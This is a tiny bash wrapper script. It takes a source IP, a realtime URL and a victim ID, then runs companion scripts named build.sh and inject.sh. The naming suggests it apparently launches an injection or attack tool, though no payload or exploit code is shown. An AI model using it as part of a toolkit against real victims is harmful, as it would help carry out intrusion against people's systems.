#!/bin/bash

BASEDIR=$(dirname -- "$(readlink -f -- "${BASH_SOURCE}")")

SOURCEIP=$1
REALTIMEURL=$2
VICTIMID=$3

$BASEDIR/build.sh ${REALTIMEURL} ${VICTIMID}
$BASEDIR/inject.sh ${SOURCEIP}
